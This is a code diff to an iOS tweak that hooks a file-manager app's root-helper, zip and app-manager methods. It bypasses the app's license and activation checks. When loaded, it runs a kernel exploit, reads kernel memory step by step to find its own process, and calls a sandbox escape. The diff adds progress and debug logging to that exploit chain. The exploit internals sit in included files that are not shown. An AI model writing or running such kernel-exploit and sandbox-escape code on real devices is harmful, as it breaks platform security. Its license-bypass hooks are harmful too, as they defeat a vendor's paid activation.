@@ -5,7 +5,10 @@
 
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/kutils.h"
+#include "kexploit/offsets.h"
+#include "kexploit/krw.h"
 #include "sandbox_escape.h"
+#include "ProgressAlert.h"
 
 #pragma mark - Root Helper Hooks
 
@@ -479,112 +482,288 @@ static void hook_activationViewDidLoad(id self, SEL _cmd) {
     NSLog(@"[Tweak] Suppressed activation nag");
 }
 
-#pragma mark - Hook Installation
+#pragma mark - Hook Installation (instrumented)
+
+// Helper: install a single hook and report result
+#define HOOK_INSTANCE(cls, selStr, imp, types) \
+    do { \
+        Method _m = class_getInstanceMethod(cls, NSSelectorFromString(selStr)); \
+        if (_m) { method_setImplementation(_m, (IMP)(imp)); \
+            progress_ok([NSString stringWithFormat:@"-[%s %s]", class_getName(cls), selStr]); } \
+        else { progress_warn([NSString stringWithFormat:@"not found: -[%s %s]", class_getName(cls), selStr]); } \
+    } while(0)
+
+#define HOOK_INSTANCE_SAVE(cls, selStr, imp, types, origPtr) \
+    do { \
+        Method _m = class_getInstanceMethod(cls, NSSelectorFromString(selStr)); \
+        if (_m) { *(origPtr) = method_getImplementation(_m); method_setImplementation(_m, (IMP)(imp)); \
+            progress_ok([NSString stringWithFormat:@"-[%s %s]", class_getName(cls), selStr]); } \
+        else { progress_warn([NSString stringWithFormat:@"not found: -[%s %s]", class_getName(cls), selStr]); } \
+    } while(0)
+
+#define HOOK_CLASS_SAVE(cls, selStr, imp, types, origPtr) \
+    do { \
+        Class _meta = object_getClass(cls); \
+        Method _m = class_getClassMethod(cls, NSSelectorFromString(selStr)); \
+        if (_m) { *(origPtr) = method_getImplementation(_m); \
+            class_replaceMethod(_meta, NSSelectorFromString(selStr), (IMP)(imp), types); \
+            progress_ok([NSString stringWithFormat:@"+[%s %s]", class_getName(cls), selStr]); } \
+        else { progress_warn([NSString stringWithFormat:@"not found: +[%s %s]", class_getName(cls), selStr]); } \
+    } while(0)
+
+#define REPLACE_CLASS(cls, selStr, imp, types) \
+    do { \
+        class_replaceMethod(cls, NSSelectorFromString(selStr), (IMP)(imp), types); \
+        progress_ok([NSString stringWithFormat:@"-[%s %s]", class_getName(cls), selStr]); \
+    } while(0)
+
+#define REPLACE_META(meta, cls, selStr, imp, types) \
+    do { \
+        class_replaceMethod(meta, NSSelectorFromString(selStr), (IMP)(imp), types); \
+        progress_ok([NSString stringWithFormat:@"+[%s %s]", class_getName(cls), selStr]); \
+    } while(0)
 
 static void installHooks(void) {
+    // ── 1. Root-helper bypass ─────────────────────────────────────────────────
+    progress_log(@"Stage 1/4: root-helper bypass hooks");
     Class rfm = NSClassFromString(@"TGRootFileManager");
     if (rfm) {
         Class meta = object_getClass(rfm);
-        class_replaceMethod(meta, NSSelectorFromString(@"isRootHelperAvailable"), (IMP)hook_isRootHelperAvailable, "B@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRootHelper"), (IMP)hook_spawnRootHelper, "i@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRootHelperIfNeeds"), (IMP)hook_spawnRootHelperIfNeeds, "i@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"respawnRootHelper"), (IMP)hook_respawnRootHelper, "i@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"tryLoadFilzaHelper"), (IMP)hook_tryLoadFilzaHelper, "v@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"createHelperConnectionIfNeeds"), (IMP)hook_createHelperConnectionIfNeeds, "v@:");
-        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRoot:args:pid:"), (IMP)hook_spawnRoot_args_pid, "i@:@@^i");
-        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:"), (IMP)hook_sendObjectWithReplySync, "@@:@");
-        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:fileDescriptor:"), (IMP)hook_sendObjectWithReplySync_fd, "@@:@^i");
-        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:fileDescriptor:logintty:"), (IMP)hook_sendObjectWithReplySync_fd_logintty, "@@:@^iB");
-        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectNoReply:"), (IMP)hook_sendObjectNoReply, "v@:@");
-        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplyAsync:queue:completion:"), (IMP)hook_sendObjectWithReplyAsync, "v@:@@?");
+        REPLACE_META(meta, rfm, @"isRootHelperAvailable",            hook_isRootHelperAvailable,            "B@:");
+        REPLACE_CLASS(rfm,      @"spawnRootHelper",                   hook_spawnRootHelper,                  "i@:");
+        REPLACE_CLASS(rfm,      @"spawnRootHelperIfNeeds",            hook_spawnRootHelperIfNeeds,           "i@:");
+        REPLACE_CLASS(rfm,      @"respawnRootHelper",                 hook_respawnRootHelper,                "i@:");
+        REPLACE_CLASS(rfm,      @"tryLoadFilzaHelper",                hook_tryLoadFilzaHelper,               "v@:");
+        REPLACE_CLASS(rfm,      @"createHelperConnectionIfNeeds",     hook_createHelperConnectionIfNeeds,    "v@:");
+        REPLACE_CLASS(rfm,      @"spawnRoot:args:pid:",               hook_spawnRoot_args_pid,               "i@:@@^i");
+        REPLACE_CLASS(rfm,      @"sendObjectWithReplySync:",          hook_sendObjectWithReplySync,          "@@:@");
+        REPLACE_CLASS(rfm,      @"sendObjectWithReplySync:fileDescriptor:",
+                                                                       hook_sendObjectWithReplySync_fd,       "@@:@^i");
+        REPLACE_CLASS(rfm,      @"sendObjectWithReplySync:fileDescriptor:logintty:",
+                                                                       hook_sendObjectWithReplySync_fd_logintty, "@@:@^iB");
+        REPLACE_CLASS(rfm,      @"sendObjectNoReply:",                hook_sendObjectNoReply,                "v@:@");
+        REPLACE_CLASS(rfm,      @"sendObjectWithReplyAsync:queue:completion:",
+                                                                       hook_sendObjectWithReplyAsync,         "v@:@@?");
+        progress_ok(@"TGRootFileManager — 12 methods patched");
+    } else {
+        progress_warn(@"TGRootFileManager not found (class not loaded yet?)");
     }
+    progress_set(10.f);
+
+    // ── 2. Zip / unzip hooks ──────────────────────────────────────────────────
+    progress_log(@"Stage 2/4: zip/unzip hooks");
     Class zipper = NSClassFromString(@"Zipper");
     if (zipper) {
-        Method m;
-        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"ZipFiles:toFilePath:currentDirectory:"));
-        if (m) { orig_ZipFiles = method_getImplementation(m); method_setImplementation(m, (IMP)hook_ZipFiles); }
-        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"unZipFile:toPath:currentDirectory:outMessage:"));
-        if (m) { orig_unZipFile = method_getImplementation(m); method_setImplementation(m, (IMP)hook_unZipFile); }
-        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"unZipFile:toPath:currentDirectory:withPassword:outMessage:"));
-        if (m) { orig_unZipFilePassword = method_getImplementation(m); method_setImplementation(m, (IMP)hook_unZipFilePassword); }
+        HOOK_INSTANCE_SAVE(zipper, @"ZipFiles:toFilePath:currentDirectory:",
+                           hook_ZipFiles, "@@:@@@", &orig_ZipFiles);
+        HOOK_INSTANCE_SAVE(zipper, @"unZipFile:toPath:currentDirectory:outMessage:",
+                           hook_unZipFile, "@@:@@@^@", &orig_unZipFile);
+        HOOK_INSTANCE_SAVE(zipper, @"unZipFile:toPath:currentDirectory:withPassword:outMessage:",
+                           hook_unZipFilePassword, "@@:@@@@^@", &orig_unZipFilePassword);
+        progress_ok(@"Zipper — 3 methods patched");
+    } else {
+        progress_warn(@"Zipper not found (minizip hooks skipped)");
     }
+    progress_set(20.f);
 
-    // License/integrity bypass
+    // ── 3. License / integrity bypass ─────────────────────────────────────────
+    progress_log(@"Stage 3/4: license + activation bypass");
     Class alertCtrl = NSClassFromString(@"TGAlertController");
     if (alertCtrl) {
-        Class alertMeta = object_getClass(alertCtrl);
-        Method m = class_getClassMethod(alertCtrl, NSSelectorFromString(@"showAlertWithTitle:text:cancelButton:otherButtons:completion:"));
-        if (m) {
-            orig_showAlert = method_getImplementation(m);
-            class_replaceMethod(alertMeta, NSSelectorFromString(@"showAlertWithTitle:text:cancelButton:otherButtons:completion:"),
-                (IMP)hook_showAlertWithTitle, "@@:@@@@@");
-        }
+        HOOK_CLASS_SAVE(alertCtrl,
+                        @"showAlertWithTitle:text:cancelButton:otherButtons:completion:",
+                        hook_showAlertWithTitle, "@@:@@@@@", &orig_showAlert);
+    } else {
+        progress_warn(@"TGAlertController not found");
     }
     Class activationVC = NSClassFromString(@"NewActivationViewController");
     if (activationVC) {
-        Method m = class_getInstanceMethod(activationVC, @selector(viewDidLoad));
-        if (m) {
-            orig_activationViewDidLoad = method_getImplementation(m);
-            method_setImplementation(m, (IMP)hook_activationViewDidLoad);
-        }
+        HOOK_INSTANCE_SAVE(activationVC, @"viewDidLoad",
+                           hook_activationViewDidLoad, "v@:", &orig_activationViewDidLoad);
+    } else {
+        progress_warn(@"NewActivationViewController not found");
     }
+    progress_set(30.f);
 
-    // Apps Manager fixes
+    // ── 4. Apps Manager fixes ─────────────────────────────────────────────────
+    progress_log(@"Stage 4/4: Apps Manager hooks");
     Class lsWorkspace = NSClassFromString(@"LSApplicationWorkspace");
     if (lsWorkspace) {
-        Method m = class_getInstanceMethod(lsWorkspace, NSSelectorFromString(@"allApplications"));
-        if (m) { orig_allApplications = method_getImplementation(m); method_setImplementation(m, (IMP)hook_allApplications); }
+        HOOK_INSTANCE_SAVE(lsWorkspace, @"allApplications",
+                           hook_allApplications, "@@:", &orig_allApplications);
+    } else {
+        progress_warn(@"LSApplicationWorkspace not found");
     }
     Class appItem = NSClassFromString(@"ApplicationItem");
     if (appItem) {
-        Method m;
-        m = class_getInstanceMethod(appItem, NSSelectorFromString(@"setAppProxy:"));
-        if (m) { orig_setAppProxy = method_getImplementation(m); method_setImplementation(m, (IMP)hook_setAppProxy); }
+        HOOK_INSTANCE_SAVE(appItem, @"setAppProxy:",
+                           hook_setAppProxy, "v@:@", &orig_setAppProxy);
+    } else {
+        progress_warn(@"ApplicationItem not found");
     }
     Class appsVC = NSClassFromString(@"TGApplicationsViewController");
     if (appsVC) {
-        Method m = class_getInstanceMethod(appsVC, NSSelectorFromString(@"browserView:didSelectItemAtIndexPath:"));
-        if (m) { orig_didSelectItem = method_getImplementation(m); method_setImplementation(m, (IMP)hook_didSelectItem); }
+        HOOK_INSTANCE_SAVE(appsVC, @"browserView:didSelectItemAtIndexPath:",
+                           hook_didSelectItem, "v@:@@", &orig_didSelectItem);
+    } else {
+        progress_warn(@"TGApplicationsViewController not found");
     }
-
-    NSLog(@"[Tweak] All hooks installed");
+    progress_set(40.f);
+    progress_ok(@"All hooks installed");
 }
 
-#pragma mark - Exploit (silent, background)
+#pragma mark - Exploit (instrumented)
 
 static void runExploit(void) {
-    NSLog(@"[Tweak] Running kexploit...");
+    // ── Kernel exploit ────────────────────────────────────────────────────────
+    progress_log(@"Running kexploit_opa334…");
+    progress_set(45.f);
+
     int kret = kexploit_opa334();
+
     if (kret != 0) {
-        NSLog(@"[Tweak] kexploit failed: %d", kret);
+        progress_fail([NSString stringWithFormat:@"kexploit_opa334 FAILED (ret=%d)", kret]);
+        progress_set(100.f);
+        progress_done(NO);
         return;
     }
+    progress_ok([NSString stringWithFormat:@"kexploit_opa334 succeeded (ret=%d)", kret]);
+    progress_set(65.f);
 
-    NSLog(@"[Tweak] kexploit succeeded, escaping sandbox...");
-    uint64_t self_proc_addr = proc_self();
+    // ── Dump all offsets used by proc_self() before touching kernel memory ────
+    sleep(2);
+    progress_log([NSString stringWithFormat:
+        @"[DBG] offsets dump: rwSocketPcb=0x%llx", rwSocketPcb]);
+    progress_log([NSString stringWithFormat:
+        @"[DBG]   off_inpcb_inp_socket=0x%x", off_inpcb_inp_socket]);
+    progress_log([NSString stringWithFormat:
+        @"[DBG]   off_socket_so_background_thread=0x%x", off_socket_so_background_thread]);
+    progress_log([NSString stringWithFormat:
+        @"[DBG]   off_thread_t_tro=0x%x", off_thread_t_tro]);
+    progress_log([NSString stringWithFormat:
+        @"[DBG]   off_thread_ro_tro_proc=0x%x", off_thread_ro_tro_proc]);
+    progress_log([NSString stringWithFormat:
+        @"[DBG]   VM_MIN=0x%llx  VM_MAX=0x%llx", VM_MIN_KERNEL_ADDRESS, VM_MAX_KERNEL_ADDRESS]);
+    sleep(2);
+
+    // ── Inline proc_self() step by step ──────────────────────────────────────
+    // Step A: read socket address from inpcb
+    uint64_t dbg_target_A = rwSocketPcb + off_inpcb_inp_socket;
+    progress_log([NSString stringWithFormat:
+        @"[DBG] procSelf A — about to kread64(rwSocketPcb+off_inpcb_inp_socket) @ 0x%llx", dbg_target_A]);
+    sleep(2);
+    uint64_t rwSocketAddr = kread64(dbg_target_A);
+    progress_ok([NSString stringWithFormat:@"[DBG] procSelf A returned rwSocketAddr=0x%llx  valid=%s",
+        rwSocketAddr, is_kaddr_valid(rwSocketAddr) ? "YES" : "NO ← PROBLEM"]);
+    sleep(2);
+
+    // Step B: read background_thread from socket
+    uint64_t dbg_target_B = rwSocketAddr + off_socket_so_background_thread;
+    progress_log([NSString stringWithFormat:
+        @"[DBG] procSelf B — about to kread64(rwSocketAddr+off_so_bg_thread) @ 0x%llx", dbg_target_B]);
+    sleep(2);
+    uint64_t current_thread = kread64(dbg_target_B);
+    progress_ok([NSString stringWithFormat:@"[DBG] procSelf B returned current_thread=0x%llx  valid=%s",
+        current_thread, is_kaddr_valid(current_thread) ? "YES" : "NO ← PROBLEM"]);
+    sleep(2);
+
+    // Step C: read t_tro from thread
+    uint64_t dbg_target_C = current_thread + off_thread_t_tro;
+    progress_log([NSString stringWithFormat:
+        @"[DBG] procSelf C — about to kread64(current_thread+off_thread_t_tro) @ 0x%llx", dbg_target_C]);
+    sleep(2);
+    uint64_t current_thread_ro = kread64(dbg_target_C);
+    progress_ok([NSString stringWithFormat:@"[DBG] procSelf C returned current_thread_ro=0x%llx  valid=%s",
+        current_thread_ro, is_kaddr_valid(current_thread_ro) ? "YES" : "NO ← PROBLEM"]);
+    sleep(2);
+
+    // Step D: read tro_proc from thread_ro
+    uint64_t dbg_target_D = current_thread_ro + off_thread_ro_tro_proc;
+    progress_log([NSString stringWithFormat:
+        @"[DBG] procSelf D — about to kread64(current_thread_ro+off_tro_proc) @ 0x%llx", dbg_target_D]);
+    sleep(2);
+    uint64_t self_proc_addr = kread64(dbg_target_D);
+    progress_ok([NSString stringWithFormat:@"[DBG] procSelf D returned self_proc=0x%llx  valid=%s",
+        self_proc_addr, is_kaddr_valid(self_proc_addr) ? "YES" : "NO ← PROBLEM"]);
+    sleep(2);
+
+    if (self_proc_addr) {
+        progress_ok([NSString stringWithFormat:@"proc_self() = 0x%llx", self_proc_addr]);
+    } else {
+        progress_fail(@"proc_self() returned 0 — KRW may be broken");
+    }
+    progress_set(68.f);
+
+    // ── Sandbox escape ────────────────────────────────────────────────────────
+    progress_log(@"Running sandbox_escape()…");
     int sret = sandbox_escape(self_proc_addr);
-    NSLog(@"[Tweak] sandbox_escape returned %d", sret);
+
+    if (sret == 0) {
+        progress_ok([NSString stringWithFormat:@"sandbox_escape succeeded (ret=%d)", sret]);
+    } else {
+        progress_fail([NSString stringWithFormat:@"sandbox_escape FAILED (ret=%d)", sret]);
+    }
+
+    // ── Final end-to-end verification ─────────────────────────────────────────
+    progress_log(@"Final verification: writing to /var/mobile/…");
+    progress_set(95.f);
+    int fd_final = open("/var/mobile/.jds_final_check", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_final >= 0) {
+        close(fd_final);
+        unlink("/var/mobile/.jds_final_check");
+        progress_ok(@"Write to /var/mobile/ succeeded — R+W confirmed");
+        progress_set(100.f);
+        progress_done(YES);
+    } else {
+        progress_fail([NSString stringWithFormat:@"Write to /var/mobile/ FAILED (errno=%d: %s)",
+                       errno, strerror(errno)]);
+        progress_set(100.f);
+        progress_done(NO);
+    }
 }
 
 #pragma mark - Entry Point
 
 __attribute__((constructor)) void TweakInit(void) {
+    // Set up the line buffer (UIKit not ready yet — nothing can be presented)
+    progress_show();
+
+    // Install all hooks — lines are buffered until the alert is presented
     installHooks();
 
-    // Check if sandbox is already escaped
-    int fd = open("/var/mobile/.sbx_check", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd >= 0) {
-        close(fd); unlink("/var/mobile/.sbx_check");
-        NSLog(@"[Tweak] Sandbox already escaped");
-        return;
-    }
+    // UIApplicationDidFinishLaunchingNotification fires on the main thread,
+    // which is the earliest safe point to present a UIAlertController.
+    [[NSNotificationCenter defaultCenter]
+        addObserverForName:UIApplicationDidFinishLaunchingNotification
+                    object:nil
+                     queue:[NSOperationQueue mainQueue]   // ensure main thread
+                usingBlock:^(NSNotification *note) {
 
-    // Run exploit AFTER app finishes launching (UIKit must be ready for offsets_init
-    // which uses UIDevice.currentDevice.systemVersion)
-    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification
-        object:nil queue:nil usingBlock:^(NSNotification *note) {
-        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-            runExploit();
-        });
+        // Present the alert and flush all buffered hook-install lines into it
+        progress_uikit_ready();
+
+        // Give the alert's presentation animation ~0.1 s to start, then run
+        // the exploit on a background thread (buffering handles any lines that
+        // arrive before the completion block fires and marks _presented = YES)
+        dispatch_after(
+            dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)),
+            dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
+            ^{
+                // ── Pre-flight sandbox check ───────────────────────────────
+                progress_log(@"Pre-flight: checking if sandbox already escaped…");
+                int fd = open("/var/mobile/.sbx_check", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (fd >= 0) {
+                    close(fd); unlink("/var/mobile/.sbx_check");
+                    progress_ok(@"Sandbox already escaped — skipping exploit");
+                    progress_set(100.f);
+                    progress_done(YES);
+                    return;
+                }
+                progress_log([NSString stringWithFormat:
+                    @"Not yet escaped (errno=%d) — running exploit", errno]);
+                progress_set(42.f);
+
+                runExploit();
+            });
     }];
 }
